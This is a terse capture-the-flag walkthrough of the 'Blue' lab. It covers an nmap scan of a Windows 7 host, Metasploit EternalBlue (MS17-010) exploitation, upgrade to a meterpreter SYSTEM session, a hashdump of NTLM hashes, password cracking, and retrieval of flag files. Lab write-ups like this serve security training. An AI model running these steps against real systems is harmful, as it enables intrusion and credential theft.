---
title: blue
---

# TASK 1 - RECON

```bash
kali@kali:~$ nmap -A  10.10.126.100
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 08:21 EDT
Nmap scan report for 10.10.126.100
Host is up (0.28s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:04:9f:8c:be:d4 (unknown)                                          
| smb-os-discovery:                                                                                                                        
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)                                                            
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional                                                                                   
|   Computer name: Jon-PC                                                                                                                  
|   NetBIOS computer name: JON-PC\x00                                                                                                      
|   Workgroup: WORKGROUP\x00                                                                                                               
|_  System time: 2020-06-17T07:22:51-05:00                                                                                                 
| smb-security-mode:                                                                                                                       
|   account_used: guest                                                                                                                    
|   authentication_level: user                                                                                                             
|   challenge_response: supported                                                                                                          
|_  message_signing: disabled (dangerous, but default)                                                                                     
| smb2-security-mode:                                                                                                                      
|   2.02:                                                                                                                                  
|_    Message signing enabled but not required                                                                                             
| smb2-time:                                                                                                                               
|   date: 2020-06-17T12:22:51                                                                                                              
|_  start_date: 2020-06-17T12:18:40

```

# TASK 2 - GAIN ACCESS

```bash
$ msfconsole
> search ms17
> use exploit/windows/smb/ms17_010_eternalblue
> info
> options
> set RHOSTS 10.10.174.139
> run
WIN
```

# TASK 3 - ESCALATE

```bash
C:\  > # ctrl-z to background
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 > option
msf5 > sessions
msf5 > set session 1
msf5 > run
msf5 > sessions 2 # enter remote in meterpreter shell
met  >  shell # back to shell
C:\  > whoami # nt authoritiy\system
C:\  > # ctrl-z background - back to meterpreter
met  > ps # note any pid running from nt authority\system
met  > migrate 2696 # run from process with nt authority\system
```

# TASK 4 - CRACKING

```bash
hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
# save those to txt including username etc
sudo john pw.txt
PASSWORD CRACK FAIL
alqfna22
```

# TASK 5 - FLAGS

```bash

met > pwd
met > cd c:/
met > ls
met > cat flag1.txt
flag{access_the_machine}

met > search -f flag*.txt
Found 3 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
cd win

cat c:/Windows/System32/config/flag2.txt
flag{sam_database_elevated_access}

cat c:/Users/Jon/Documents/flag3.txt
flag{admin_documents_can_be_valuable}
```